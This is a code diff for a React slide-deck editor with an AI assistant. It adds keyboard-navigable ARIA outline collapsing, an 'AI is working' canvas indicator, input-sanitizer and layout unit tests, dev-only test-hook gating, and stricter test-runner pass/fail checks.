+function ModuleList({ lanes, selectedId, slideIndex, selectedSlideIndices, collapsedSections, dispatch, maxModuleTime, guidelines, reviewMode }) {
   const [adding, setAdding] = useState(false);
   const [val, setVal] = useState("");
-  // Collapse state lives here (not per-ConceptRow) so a Ctrl/Cmd-click on any
-  // section's toggle can collapse or expand every section at once.
-  const [collapsedIds, setCollapsedIds] = useState(() => new Set());
   const laneId = lanes[0]?.id;
   const allItems = lanes.flatMap((l) => [...l.items].sort((a, b) => (a.order ?? 999) - (b.order ?? 999)));
-  const toggleCollapse = (id, all) => {
-    setCollapsedIds((prev) => {
-      if (all) {
-        // Apply the state this item is about to switch to (the opposite of
-        // its current state) to every section.
-        return prev.has(id) ? new Set() : new Set(allItems.map((i) => i.id));
-      }
-      const next = new Set(prev);
-      if (next.has(id)) next.delete(id); else next.add(id);
-      return next;
-    });
+  // CR2: collapse state now lives in the reducer (state.collapsedSections) so the
+  // TOC disclosure keys + the collapsed-header current-slide marker can read/act on it.
+  const collapsedSet = React.useMemo(() => new Set(Array.isArray(collapsedSections) ? collapsedSections : []), [collapsedSections]);
+  const allIds = allItems.map((i) => i.id);
+  const toggleCollapse = (id, all) => dispatch({ type: "TOGGLE_SECTION_COLLAPSE", id, all, ids: allIds });
+
+  // ── Roving-tabindex tree focus (WAI-ARIA disclosure pattern) ──
+  // A single tab stop for the whole rail; arrow keys move DOM focus between the
+  // focused treeitem's neighbors. Row ids: section = item.id, slide = `${item.id}:${si}`.
+  const [focusedRowId, setFocusedRowId] = useState(null);
+  const rowRefs = useRef({}); // rowId -> DOM element (for programmatic .focus())
+  const focusRow = (rowId) => { setFocusedRowId(rowId); requestAnimationFrame(() => rowRefs.current[rowId]?.focus()); };
+  // ── Selection-follows-focus ──────────────────────────────────────────
+  // The tree cursor IS the selection: moving it dispatches the REAL slide
+  // selection (SELECT / SET_SLIDE_INDEX) so the preview and the single active-
+  // slide indicator move together — never a separate roaming focus ring.
+  // Vertical nav rail. Collapse-aware: an expanded section contributes every slide,
+  // a COLLAPSED section contributes a single unit (its first slide) so Up/Down move
+  // section-to-section and entering a folded section shows its first slide. Empty
+  // sections are skipped.
+  const buildNavRail = () => {
+    const rail = [];
+    for (const item of allItems) {
+      const n = item.slides?.length || 0;
+      if (n === 0) continue;
+      if (collapsedSet.has(item.id)) rail.push({ itemId: item.id, si: 0 });
+      else for (let si = 0; si < n; si++) rail.push({ itemId: item.id, si });
+    }
+    return rail;
   };
+  const selectSlide = (itemId, si) => {
+    if (itemId !== selectedId) dispatch({ type: "SELECT", id: itemId, slideIndex: si });
+    else dispatch({ type: "SET_SLIDE_INDEX", index: si });
+    // Focus the row that will be active: the slide row when its section is
+    // expanded, or the always-mounted header (with its k/N marker) when folded.
+    focusRow(collapsedSet.has(itemId) ? itemId : itemId + ":" + si);
+  };
+  // Step the nav rail (slide→slide inside expanded sections, section→section over
+  // folded ones); no-op at the deck ends. A collapsed section is one unit, so match
+  // it by section id regardless of the active slide index inside it.
+  const moveSelection = (itemId, si, dir) => { const rail = buildNavRail(); const idx = rail.findIndex((r) => r.itemId === itemId && (collapsedSet.has(itemId) || r.si === si)); if (idx < 0) return; const t = idx + dir; if (t < 0 || t >= rail.length) return; selectSlide(rail[t].itemId, rail[t].si); };
+  // Leave a section header into the nearest section (in dir) that has slides.
+  const moveFromHeader = (itemId, dir) => { const idx = allItems.findIndex((i) => i.id === itemId); if (idx < 0) return; for (let j = idx + dir; j >= 0 && j < allItems.length; j += dir) { const it = allItems[j]; if ((it.slides?.length || 0) > 0) { selectSlide(it.id, dir > 0 ? 0 : it.slides.length - 1); return; } } };
+  const treeNav = { focusedRowId, setRef: (id, el) => { if (el) rowRefs.current[id] = el; else delete rowRefs.current[id]; }, focusRow, selectSlide, moveSelection, moveFromHeader, onFocusRow: (id) => setFocusedRowId(id), allIds };
+
   const totalDeckTime = React.useMemo(() => allItems.reduce((s, i) => s + sumVisibleDurations(i.slides), 0), [allItems]);
   const globalMaxSlideDur = React.useMemo(() => { let m = 0; for (const i of allItems) for (const s of (i.slides || [])) { if ((s.duration || 0) > m) m = s.duration; } return m || 1; }, [allItems]);
   const addItem = () => { if (!val.trim() || !laneId) return; dispatch({ type: "ADD_ITEM", laneId, title: val.trim() }); setVal(""); };
@@ -8223,14 +9112,14 @@ function ModuleList({ lanes, selectedId, slideIndex, selectedSlideIndices, dispa
   const handleDrop = (e) => { if (!_velaDrag || _velaDrag.kind !== "section" || !laneId) return; e.preventDefault(); dispatch({ type: "DRAG_REORDER", id: _velaDrag.itemId, targetLaneId: laneId, beforeId: null, afterId: null }); };
 
   return (
-    <div onDragOver={(e) => { if (_velaDrag && _velaDrag.kind === "section") { e.preventDefault(); e.dataTransfer.dropEffect = "move"; } }} onDrop={handleDrop}>
+    <div role="tree" aria-label="Slide outline" data-testid="toc-tree" onDragOver={(e) => { if (_velaDrag && _velaDrag.kind === "section") { e.preventDefault(); e.dataTransfer.dropEffect = "move"; } }} onDrop={handleDrop}>
       {(() => { let offset = 0; let timeOffset = 0; return allItems.map((item, idx) => {
         const itemLaneId = lanes.find((l) => l.items.some((i) => i.id === item.id))?.id || laneId;
         const slideOffset = offset;
         const slideTimeOffset = timeOffset;
         offset += (item.slides?.length || 0);
         timeOffset += (item.slides || []).reduce((a, sl) => a + (sl.duration || 0), 0);
-        return <ConceptRow key={item.id} item={item} selected={selectedId === item.id} slideIndex={slideIndex} selectedSlideIndices={selectedSlideIndices} lanes={lanes} laneId={itemLaneId} dispatch={dispatch} maxTime={totalDeckTime} globalMaxSlideDur={globalMaxSlideDur} guidelines={guidelines} slideOffset={slideOffset} slideTimeOffset={slideTimeOffset} reviewMode={reviewMode} isFirst={idx === 0} isLast={idx === allItems.length - 1} collapsed={collapsedIds.has(item.id)} onToggleCollapse={(all) => toggleCollapse(item.id, all)} />;
+        return <ConceptRow key={item.id} item={item} selected={selectedId === item.id} slideIndex={slideIndex} selectedSlideIndices={selectedSlideIndices} lanes={lanes} laneId={itemLaneId} dispatch={dispatch} maxTime={totalDeckTime} globalMaxSlideDur={globalMaxSlideDur} guidelines={guidelines} slideOffset={slideOffset} slideTimeOffset={slideTimeOffset} reviewMode={reviewMode} isFirst={idx === 0} isLast={idx === allItems.length - 1} collapsed={collapsedSet.has(item.id)} onToggleCollapse={(all) => toggleCollapse(item.id, all)} treeNav={treeNav} />;
       }); })()}
       {adding ? <div style={{ padding: "4px 12px", display: "flex", gap: 4 }}>
         <input autoFocus value={val} onChange={(e) => setVal(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter") addItem(); if (e.key === "Escape") setAdding(false); }} placeholder="Section name" style={S.input()} />
@@ -8382,11 +9271,20 @@ function ChatPanel({ state, dispatch, isMobile, getLayoutStats }) {
     };
     const onToolCall = (evt) => {
       dispatch({ type: "STREAM_TOOL", event: evt });
+      // CR5: mirror "Vera is working" onto the canvas — this is the core of the CR
+      // (chat/engine edits previously animated nothing). On `calling`, scan the
+      // slide currently in view; when a tool completes with a jump, follow it and
+      // move the scan to the edited slide. FINALIZE_STREAM clears aiWork → the
+      // SlidePanel plays magic-reveal on the on-screen edited slide.
+      if (evt.type === "calling" && state.selectedId) {
+        dispatch({ type: "SET_AI_WORK", value: { itemId: state.selectedId, slideIdx: state.slideIndex } });
+      }
       // Auto-navigate when a tool completes with a jump
       if (evt.type === "done" && evt.jump?.length > 0) {
         const j = evt.jump[0];
         dispatch({ type: "SELECT", id: j.itemId });
         dispatch({ type: "SET_SLIDE_INDEX", index: j.slideIdx ?? 0 });
+        dispatch({ type: "SET_AI_WORK", value: { itemId: j.itemId, slideIdx: j.slideIdx ?? 0 } });
       }
     };
     const layoutStats = getLayoutStats?.() || null;
@@ -8403,6 +9301,7 @@ function ChatPanel({ state, dispatch, isMobile, getLayoutStats }) {
     if (result.branding) dispatch({ type: "SET_BRANDING", branding: result.branding });
     dispatch({ type: "SET_DEBUG", text: result.debug || "" });
     dispatch({ type: "SET_LOADING", value: false });
+    dispatch({ type: "SET_AI_WORK", value: null }); // CR5 fail-safe: never leave a slide stuck shimmering
     // Register late-reply handler for SSE recovery (channel timeout fallback)
     if (result._lateReplyPending) {
       window.__velaLateReply = (msg, jumps) => {
@@ -8437,7 +9336,8 @@ function ChatPanel({ state, dispatch, isMobile, getLayoutStats }) {
       dispatch({ type: "SET_LOADING", value: true });
       dispatch({ type: "ADD_MSG", role: "assistant", content: "", tools: [], _streaming: true });
       const onUpdate = (lanes, debug) => { dispatch({ type: "LOAD_LANES", lanes }); dispatch({ type: "SET_DEBUG", text: debug }); };
-      const onToolCall = (evt) => { dispatch({ type: "STREAM_TOOL", event: evt }); if (evt.type === "done" && evt.jump?.length > 0) { dispatch({ type: "SELECT", id: evt.jump[0].itemId }); dispatch({ type: "SET_SLIDE_INDEX", index: evt.jump[0].slideIdx ?? 0 }); } };
+      // CR5: same canvas "working" mirror as the main send() path (see there).
+      const onToolCall = (evt) => { dispatch({ type: "STREAM_TOOL", event: evt }); if (evt.type === "calling" && state.selectedId) { dispatch({ type: "SET_AI_WORK", value: { itemId: state.selectedId, slideIdx: state.slideIndex } }); } if (evt.type === "done" && evt.jump?.length > 0) { dispatch({ type: "SELECT", id: evt.jump[0].itemId }); dispatch({ type: "SET_SLIDE_INDEX", index: evt.jump[0].slideIdx ?? 0 }); dispatch({ type: "SET_AI_WORK", value: { itemId: evt.jump[0].itemId, slideIdx: evt.jump[0].slideIdx ?? 0 } }); } };
       callVera(msg, state.lanes, state.selectedId, state.slideIndex, onUpdate, imgs, state.branding, state.guidelines, onToolCall, state.chatMessages).then((result) => {
         dispatch({ type: "FINALIZE_STREAM", content: result.message, jumps: result.jumps });
         if (result.jumps?.length > 0) { dispatch({ type: "SELECT", id: result.jumps[0].itemId }); dispatch({ type: "SET_SLIDE_INDEX", index: result.jumps[0].slideIdx ?? 0 }); }
@@ -8445,6 +9345,7 @@ function ChatPanel({ state, dispatch, isMobile, getLayoutStats }) {
         if (result.branding) dispatch({ type: "SET_BRANDING", branding: result.branding });
         dispatch({ type: "SET_DEBUG", text: result.debug || "" });
         dispatch({ type: "SET_LOADING", value: false });
+        dispatch({ type: "SET_AI_WORK", value: null }); // CR5 fail-safe
       });
     }, 100);
   }, [state._bootstrap]);
@@ -8711,6 +9612,29 @@ const VELA_TESTS = [
   { name: "pasteImageLayout: explicit cols preserved", fn: () => pasteImageLayout({ layout: "cols", L: [], R: [], blocks: [] }, 1) === "cols" },
   { name: "pasteImageLayout: spacer/divider ignored (title stacks)", fn: () => pasteImageLayout({ blocks: [{ type: "heading", text: "Hi" }, { type: "spacer" }, { type: "divider" }] }, 1) === "stack" },
 
+  // ── Multi-image grid placement (image-run grid, gridColsFor) ──
+  { name: "gridColsFor is function", fn: () => typeof gridColsFor === "function" },
+  { name: "gridColsFor full: N=1 → 1 (solo)", fn: () => gridColsFor(1, "full") === 1 },
+  { name: "gridColsFor full: N=2 → 2 (1x2 side-by-side)", fn: () => gridColsFor(2, "full") === 2 },
+  { name: "gridColsFor full: N=3 → 3 (thirds)", fn: () => gridColsFor(3, "full") === 3 },
+  { name: "gridColsFor full: N=4 → 2 (2x2 quad)", fn: () => gridColsFor(4, "full") === 2 },
+  { name: "gridColsFor full: N=5 → 3 (3+2)", fn: () => gridColsFor(5, "full") === 3 },
+  { name: "gridColsFor half: N=1 → 1", fn: () => gridColsFor(1, "half") === 1 },
+  { name: "gridColsFor half: N>=2 → 2", fn: () => gridColsFor(2, "half") === 2 && gridColsFor(3, "half") === 2 && gridColsFor(5, "half") === 2 },
+  { name: "gridColsFor: floors/guards bad n to 1", fn: () => gridColsFor(0, "full") === 1 && gridColsFor(-3, "full") === 1 },
+  // Full-region row math matches the spec table (rows = ceil(n/cols)).
+  { name: "gridColsFor full: N=4 makes 2 rows (2x2)", fn: () => Math.ceil(4 / gridColsFor(4, "full")) === 2 },
+  { name: "gridColsFor full: N=5 makes 2 rows (3 then 2)", fn: () => Math.ceil(5 / gridColsFor(5, "full")) === 2 },
+  { name: "gridColsFor full: N=2 stays one row", fn: () => Math.ceil(2 / gridColsFor(2, "full")) === 1 },
+
+  // pasteImageLayout with image-count n: heavy text + >=3 images → full-width header (stack)
+  { name: "pasteImageLayout: image-only slice N=2 stacks (auto-grids)", fn: () => pasteImageLayout({ blocks: [] }, 1, 2) === "stack" },
+  { name: "pasteImageLayout: content + 2 images → image-right (split grid)", fn: () => pasteImageLayout({ blocks: [{ type: "heading", text: "H" }, { type: "bullets", items: ["a", "b"] }] }, 1, 2) === "image-right" },
+  { name: "pasteImageLayout: content + 3 images → stack (header + grid below)", fn: () => pasteImageLayout({ blocks: [{ type: "heading", text: "H" }, { type: "bullets", items: ["a", "b"] }] }, 1, 3) === "stack" },
+  { name: "pasteImageLayout: content + 5 images → stack (header + grid below)", fn: () => pasteImageLayout({ blocks: [{ type: "heading", text: "H" }, { type: "bullets", items: ["a"] }] }, 1, 5) === "stack" },
+  { name: "pasteImageLayout: explicit image-left preserved even with 3 images", fn: () => pasteImageLayout({ layout: "image-left", blocks: [{ type: "bullets", items: ["a"] }] }, 1, 3) === "image-left" },
+  { name: "pasteImageLayout: title-only + 3 images still stacks", fn: () => pasteImageLayout({ blocks: [{ type: "heading", text: "Hi" }] }, 1, 3) === "stack" },
+
   // ── Editing UX Batch (v12.75): imageAspect ──
   { name: "imageAspect is function", fn: () => typeof imageAspect === "function" },
   { name: "imageAspect returns a Promise", fn: () => imageAspect("data:image/png;base64,x") instanceof Promise },
@@ -8785,6 +9709,55 @@ const VELA_TESTS = [
     let patch; patchItemAt({ items: [{ icon: "Old", text: "Keep" }] }, (p) => { patch = p; }, 0, { icon: "New" });
     return patch.items[0].icon === "New" && patch.items[0].text === "Keep";
   }},
+
+  // ── Deck-ingress key allowlist ──
+  // sanitizeSlide/sanitizeBlock build from SAFE_SLIDE_KEYS/SAFE_BLOCK_KEYS
+  // instead of copying the caller's object. Two properties with opposite failure
+  // modes: unknown/`_` keys must be DROPPED, and every live renderer key must
+  // SURVIVE — sanitizeSlide re-runs on every edit, so a lost key never returns.
+  { name: "SAFE_SLIDE_KEYS / SAFE_BLOCK_KEYS defined", fn: () => SAFE_SLIDE_KEYS instanceof Set && SAFE_BLOCK_KEYS instanceof Set && SAFE_SLIDE_KEYS.size > 20 && SAFE_BLOCK_KEYS.size > 50 },
+  { name: "allowlists reserve the '_' namespace", fn: () => ![...SAFE_SLIDE_KEYS, ...SAFE_BLOCK_KEYS].some((k) => k.startsWith("_")) },
+  { name: "sanitizeSlide drops an unknown key", fn: () => sanitizeSlide({ duration: 10, blocks: [], nope: 1 }).nope === undefined },
+  { name: "sanitizeBlock drops an unknown key", fn: () => sanitizeBlock({ type: "text", text: "t", nope: 1 }).nope === undefined },
+  { name: "sanitizeBlock drops _gridCell from deck JSON", fn: () => sanitizeBlock({ type: "image", src: "", _gridCell: true })._gridCell === undefined },
+  { name: "sanitizeBlock drops _solo from deck JSON", fn: () => sanitizeBlock({ type: "image", src: "", _solo: true })._solo === undefined },
+  { name: "sanitizeSlide drops _virtual from deck JSON", fn: () => sanitizeSlide({ duration: 10, blocks: [], _virtual: true })._virtual === undefined },
+  { name: "renderer may still set _gridCell after sanitize", fn: () => ({ ...sanitizeBlock({ type: "image", src: "" }), _gridCell: true })._gridCell === true },
+  { name: "title cards survive save→load (derived from item.presentCard)", fn: () => {
+    const it = sanitizeItem({ title: "Mod", presentCard: true, slides: [{ duration: 20, blocks: [] }] });
+    if (it.presentCard !== true) return false;
+    const card = buildTitleCardSlide(it, { title: "Lane" }, null);
+    return !!card && card._virtual === true && JSON.stringify(card.blocks).includes("Mod");
+  } },
+  { name: "live slide keys survive sanitizeSlide", fn: () => {
+    const s = sanitizeSlide({ duration: 30, blocks: [], layout: "cols", L: [], R: [], mutedColor: "#aaa",
+      notes: "n", speakerNotes: "sn", timeLock: true, imageCols: 3, contentFlex: 2, splitGap: 20, gap: 14 });
+    return s.layout === "cols" && Array.isArray(s.L) && Array.isArray(s.R) && s.mutedColor === "#aaa"
+      && s.notes === "n" && s.speakerNotes === "sn" && s.timeLock === true
+      && s.imageCols === 3 && s.contentFlex === 2 && s.splitGap === 20 && s.gap === 14;
+  } },
+  { name: "live block keys survive sanitizeBlock", fn: () => {
+    const b = sanitizeBlock({ type: "flow", items: [{ label: "a" }], direction: "vertical", loop: true,
+      loopLabel: "again", gateLabel: "G", arrowColor: "#f00", sublabelColor: "#aaa" });
+    return b.direction === "vertical" && b.loop === true && b.loopLabel === "again"
+      && b.gateLabel === "G" && b.arrowColor === "#f00" && b.sublabelColor === "#aaa";
+  } },
+  { name: "imageCols: huge value clamps to 6", fn: () => sanitizeSlide({ duration: 10, blocks: [], imageCols: 2147483647 }).imageCols === 6 },
+  { name: "imageCols: '3; x' dropped", fn: () => sanitizeSlide({ duration: 10, blocks: [], imageCols: "3; x" }).imageCols === undefined },
+  { name: "imageCols: 0 clamps to 1", fn: () => sanitizeSlide({ duration: 10, blocks: [], imageCols: 0 }).imageCols === 1 },
+  { name: "gap clamps to the 0..200 range", fn: () => sanitizeSlide({ duration: 10, blocks: [], gap: 1e9 }).gap === 200 },
+  { name: "contentFlex garbage dropped", fn: () => sanitizeSlide({ duration: 10, blocks: [], contentFlex: "wide" }).contentFlex === undefined },
+  { name: "grid nesting is depth-capped", fn: () => {
+    let node = { type: "heading", text: "BOTTOM" };
+    for (let i = 0; i < 6; i++) node = { type: "grid", cols: 1, items: [{ blocks: [node] }] };
+    let cur = sanitizeBlock(node), n = 0;
+    while (cur && cur.type === "grid") { n++; cur = cur.items?.[0]?.blocks?.[0]; }
+    return n <= MAX_BLOCK_DEPTH + 1 && (!cur || cur.text !== "BOTTOM");
+  } },
+  { name: "slide.blocks index never leaks into recursion depth", fn: () => {
+    const s = sanitizeSlide({ duration: 10, blocks: Array.from({ length: 12 }, (_, i) => ({ type: "heading", text: "B" + i })) });
+    return s.blocks.length === 12;
+  } },
 
   // ── Block Reference & Design Rules ──
   { name: "BLOCK_REFERENCE defined", fn: () => typeof BLOCK_REFERENCE === "string" && BLOCK_REFERENCE.length > 100 },
@@ -9017,6 +9990,18 @@ function VelaBatteryTest() {
 // Triggered via Ctrl+Alt+T or the "🧪 UI" button in the battery toast.
 // Tests run against whatever deck is loaded — demo deck recommended.
 
+// ── Test-hook bridge ─────────────────────────────────────────────────
+// A few suites need states with no offline UI path (study notes, block
+// injection, the AI-working flag). The app installs its test-hook object only
+// in dev/local builds that opt in (see part-app.jsx), and concat.py --release
+// strips BOTH that block and the binding below — so a release bundle carries no
+// test-hook reference at all. In a stripped build _hooks() stays the empty stub
+// and the hook-dependent tests fail loudly rather than silently passing.
+let _hooks = () => ({});
+// VELA:DEV-ONLY:BEGIN
+_hooks = () => (typeof window !== "undefined" && window.__velaTestHooks) || {};
+// VELA:DEV-ONLY:END
+
 // ── Test Primitives ──────────────────────────────────────────────────
 const _$ = (sel, root = document) => root.querySelector(sel);
 const _$$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
@@ -9127,6 +10112,21 @@ async function runUITests(onProgress) {
       // Tests flagged requiresAI degrade to a visible skip (not a failure) when
       // Vera AI is unavailable (offline/keyless) — see CR-02.
       if (test.requiresAI && typeof velaAIAvailable === "function" && !velaAIAvailable()) {
+        // Security regression tests (SVG sanitizer / redress / clickjack) must NEVER
+        // skip. CI treats a skip as non-failing, so allowing requiresAI on them would
+        // let a re-admitted <style> — or any sanitizer regression — reach green CI by
+        // skipping the real-runtime test that catches it. requiresAI on such a test is
+        // itself the tampering signal, so FAIL instead of skip. This is RUNTIME
+        // enforcement on the actual test object, immune to the source-parse dodges
+        // (comment padding, property order) that a static lint check can be fooled by.
+        const _secPat = /saniti[sz]|xss|security|redress|clickjack|<style>/i;
+        if (_secPat.test(suite.name) || _secPat.test(test.name)) {
+          failed++;
+          allResults.push({ suite: suite.name, name: test.name, pass: false, error: "security test must not be requiresAI-skippable (would let a sanitizer regression pass CI by skipping)", ms: Math.round(performance.now() - t0) });
+          if (onProgress) onProgress({ done, total, suite: suite.name, test: test.name, phase: "done", passed, failed, skipped, results: [...allResults] });
+          await _wait(20);
+          continue;
+        }
         skipped++;
         allResults.push({ suite: suite.name, name: test.name, pass: "skip", error: "AI unavailable — skipped", ms: Math.round(performance.now() - t0) });
         if (onProgress) onProgress({ done, total, suite: suite.name, test: test.name, phase: "done", passed, failed, skipped, results: [...allResults] });
@@ -9134,9 +10134,21 @@ async function runUITests(onProgress) {
         continue;
       }
       try {
-        await test.fn();
-        passed++;
-        allResults.push({ suite: suite.name, name: test.name, pass: true, ms: Math.round(performance.now() - t0) });
+        // A test passes by returning a truthy value OR by assertion-style running
+        // to completion with no explicit return (undefined). A DEFINED-FALSY return
+        // (false/null/0/"") is a real assertion failure. Historically the return
+        // value was discarded — only a throw failed a test — so every `return
+        // boolExpr` test (~a third of the battery, incl. the SVG-<style> redress
+        // regression test) could never fail. Check the result so those assertions
+        // are actually load-bearing.
+        const r = await test.fn();
+        if (r === undefined || !!r) {
+          passed++;
+          allResults.push({ suite: suite.name, name: test.name, pass: true, ms: Math.round(performance.now() - t0) });
+        } else {
+          failed++;
+          allResults.push({ suite: suite.name, name: test.name, pass: false, error: "assertion returned " + JSON.stringify(r), ms: Math.round(performance.now() - t0) });
+        }
       } catch (e) {
         failed++;
         allResults.push({ suite: suite.name, name: test.name, pass: false, error: e?.message || String(e), ms: Math.round(performance.now() - t0) });
@@ -9148,16 +10160,27 @@ async function runUITests(onProgress) {
   return allResults;
 }
 
+// VELA:DEV-ONLY:BEGIN
 // Headless entry point for automated browser drivers (see the vela-live-render
 // skill / vela-drive.js). Runs every suite and resolves to the results array,
 // also stashing it on window.__velaUITestResults for pollers.
-if (typeof window !== "undefined") {
+//
+// Kept off the production surface by the SAME two layers as the __velaTestHooks
+// object in part-app.jsx (ASVS V14.1.3 / V14.2.2), which this previously lacked:
+//   1. runtime gate — installed only in local/desktop mode, or when a harness
+//      opts in by setting window.__velaTestMode BEFORE boot (vela-drive.js does
+//      this via addInitScript, so the headless battery is unaffected);
+//   2. build-time strip — concat.py --release drops this fenced block.
+// The committed vela.jsx is a DEV build, so the gate is what keeps the battery
+// off a hosted artifact; the fence is what keeps it out of the desktop bundle.
+if (typeof window !== "undefined" && velaTestSurfaceEnabled()) {
   window.__velaRunUITests = async () => {
     const results = await runUITests();
     window.__velaUITestResults = results;
     return results;
   };
 }
+// VELA:DEV-ONLY:END
 
 // ━━━ TEST SUITES ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -9263,6 +10286,19 @@ uiSuite("Presenter", [
     if (ghostPlus.length > 0) throw new Error(`found ${ghostPlus.length} ghost "+" affordance(s) while presenting`);
     const pencil = _$$("button", fs).filter((el) => (el.textContent || "").includes("✏"));
     if (pencil.length > 0) throw new Error(`found ${pencil.length} pencil edit button(s) while presenting`);
+  }},
+  { name: "Present Edit toggle flips inline editing (Shift+E)", fn: async () => {
+    // The ✎ toggle restores click-to-edit while presenting. It must start OFF
+    // (audience-clean, per CR-03) and flip deterministically via Shift+E. The
+    // title reflects presentEdit regardless of deck content, so it's a stable
+    // signal. Reset to OFF afterwards so the audience-clean invariant holds.
+    const btn = await _waitFor(() => _$("[data-testid='present-edit-toggle']"));
+    if (!btn) throw new Error("present-edit-toggle not found in Present view");
+    if (!/^Edit mode/.test(btn.title)) throw new Error("edit toggle should start OFF while presenting");
+    _key("E", { shiftKey: true });
+    await _waitFor(() => /^Editing on/.test(_$("[data-testid='present-edit-toggle']")?.title || ""));
+    _key("E", { shiftKey: true });
+    await _waitFor(() => /^Edit mode/.test(_$("[data-testid='present-edit-toggle']")?.title || ""));
   }},
   { name: "F key exits fullscreen", fn: async () => {
     _key("f");
@@ -9665,6 +10701,136 @@ uiSuite("Slide Ops", [
   }},
 ]);
 
+// ── TOC Collapse / Keyboard-Tree Suite (CR2) ─────────────────────────
+// Verifies the roving ARIA tree, the disclosure keys (Right=expand /
+// Left=collapse on a focused section header), and the CORE fix: a collapsed
+// section that holds the active slide keeps a live k/N marker + accent border
+// so the user never loses "you are here" — WITHOUT auto-expanding.
+const _tocHeaders = () => _$$('[data-testid="toc-section-header"]');
+// NOTE: _tocRows() is defined once later in this file (shared helper) — reuse it.
+const _tocToggle = (header) => Array.from(header.querySelectorAll("span")).find((s) => (s.textContent || "").trim() === "▼");
+const _tocCollapsed = (header) => header.getAttribute("aria-expanded") === "false";
+// D3: deterministic act-and-settle for the disclosure toggle. The on-load auto-run
+// can start a beat before the roving-tree state is fully wired, so a single toggle
+// click may be dropped. Re-issue the click ONLY after giving the previous one time
+// to land (spaced re-clicks never oscillate — once the aria state matches we stop),
+// and CONFIRM the settled aria-expanded state before returning (no swallowed wait).
+const _tocDriveState = async (header, wantCollapsed) => {
+  let lastClick = 0;
+  await _waitFor(() => {
+    if (_tocCollapsed(header) === wantCollapsed) return true;
+    if (Date.now() - lastClick > 400) { const t = _tocToggle(header); if (t) { _click(t); lastClick = Date.now(); } }
+    return false;
+  }, 3000);
+};
+const _tocEnsureExpanded = (header) => _tocDriveState(header, false);
+const _tocEnsureCollapsed = (header) => _tocDriveState(header, true);
+// D3: focus a treeitem and RETRY until focus actually sticks — a collapse/expand
+// re-render (which flips the roving tabindex from -1 to 0) can drop a focus set a
+// beat too early, which is what made the key-nav tests race in the auto-run.
+const _focusTocHeader = (header) => _waitFor(() => { header.focus(); return document.activeElement === header; }, 1500);
+// Select a section header and wait for the selection (and thus its active-slide
+// marker eligibility) to actually settle before driving collapse state.
+const _selectTocHeader = async (header) => { _click(header); await _waitFor(() => header.getAttribute("aria-selected") === "true", 1500); };
+
+uiSuite("TOC Collapse Nav", [
+  { name: "Collapse hides slide rows + shows k/N marker with accent border", fn: async () => {
+    const header = await _waitFor(() => _tocHeaders()[0], 2000);
+    await _selectTocHeader(header); // select this section (active slide = its slide 0)
+    await _tocEnsureExpanded(header);
+    await _waitFor(() => _tocRows().length > 0, 1500); // rows mounted before we measure
+    const before = _tocRows().length;
+    _click(_tocToggle(header));
+    await _waitFor(() => _tocCollapsed(header) && _tocRows().length < before, 2000);
+    const marker = await _waitFor(() => header.querySelector('[data-testid="toc-collapsed-marker"]'), 1500);
+    if (!/^\d+ \/ \d+$/.test((marker.textContent || "").trim())) throw new Error("marker not k/N: " + marker.textContent);
+    if (!/2px solid/.test(header.style.borderLeft) || /transparent/.test(header.style.borderLeft)) throw new Error("no accent left-border on collapsed active header");
+    await _tocEnsureExpanded(header); // restore
+  }},
+  { name: "Marker updates live as the active slide advances (stays folded)", fn: async () => {
+    const header = await _waitFor(() => _tocHeaders()[0], 2000);
+    await _selectTocHeader(header);
+    // need a section with >= 2 slides for a live delta
+    await _tocEnsureExpanded(header);
+    await _waitFor(() => _tocRows().length > 0, 1500);
+    const n = _tocRows().length;
+    await _tocEnsureCollapsed(header);
+    const readK = () => { const m = header.querySelector('[data-testid="toc-collapsed-marker"]'); return m ? parseInt((m.textContent || "").trim(), 10) : null; };
+    await _waitFor(() => readK() != null, 1500); // collapsed active marker present before we read it
+    const k0 = readK();
+    if (k0 == null) throw new Error("no marker while collapsed");
+    if (n >= 2) {
+      document.activeElement?.blur(); await _wait(60);
+      _key("ArrowRight"); // global slide-advance (focus off the rail)
+      await _waitFor(() => readK() === k0 + 1, 1500);
+      if (_tocCollapsed(header) !== true) throw new Error("section auto-expanded — must stay folded");
+    }
+    await _tocEnsureExpanded(header); // restore
+  }},
+  { name: "ArrowRight on a focused collapsed header expands it", fn: async () => {
+    const header = await _waitFor(() => _tocHeaders()[0], 2000);
+    await _selectTocHeader(header);
+    await _tocEnsureCollapsed(header);
+    await _focusTocHeader(header); // retries until focus sticks (post-collapse re-render)
+    _key("ArrowRight");
+    await _waitFor(() => header.getAttribute("aria-expanded") === "true", 1500);
+    if (_tocRows().length === 0) throw new Error("rows did not reappear after expand");
+  }},
+  { name: "ArrowLeft on a focused expanded header collapses it", fn: async () => {
+    const header = await _waitFor(() => _tocHeaders()[0], 2000);
+    await _selectTocHeader(header);
+    await _tocEnsureExpanded(header);
+    await _focusTocHeader(header);
+    _key("ArrowLeft");
+    await _waitFor(() => header.getAttribute("aria-expanded") === "false", 1500);
+    await _tocEnsureExpanded(header); // restore
+  }},
+  { name: "ARIA tree roles + roving tabindex present", fn: async () => {
+    if (!_$('[role="tree"]')) throw new Error("no role=tree container");
+    const header = await _waitFor(() => _tocHeaders()[0], 2000);
+    if (header.getAttribute("role") !== "treeitem") throw new Error("header not role=treeitem");
+    if (!header.hasAttribute("aria-expanded")) throw new Error("header missing aria-expanded");
+    await _focusTocHeader(header);
+    await _waitFor(() => header.getAttribute("tabindex") === "0", 1500); // roving flips -1→0 on focus
+  }},
+  { name: "Arrow on a focused slide row moves the shown slide (single cursor)", fn: async () => {
+    // Regression: the outline "focus ring" used to roam independently of the shown
+    // slide, so arrows on a focused TOC row moved only the ring, not state.slideIndex.
+    // Now the tree cursor IS the selection — focus and the active slide stay together.
+    const rows = await _waitFor(() => (_tocRows().length >= 2 ? _tocRows() : null), 2000);
+    if (!rows) return; // soft pass: needs >= 2 slides in the first module
+    _click(rows[0]); // select + focus the first slide row
+    await _waitFor(() => rows[0].getAttribute("aria-selected") === "true", 1500);
+    await _waitFor(() => { rows[0].focus(); return document.activeElement === rows[0]; }, 1500);
+    const before = _hooks().getSelection && _hooks().getSelection();
+    if (!before) throw new Error("no getSelection test hook");
+    _key("ArrowDown");
+    // The REAL selection must advance (this is exactly what the bug broke).
+    await _waitFor(() => { const s = _hooks().getSelection(); return s && (s.slideIdx !== before.slideIdx || s.itemId !== before.itemId); }, 1500);
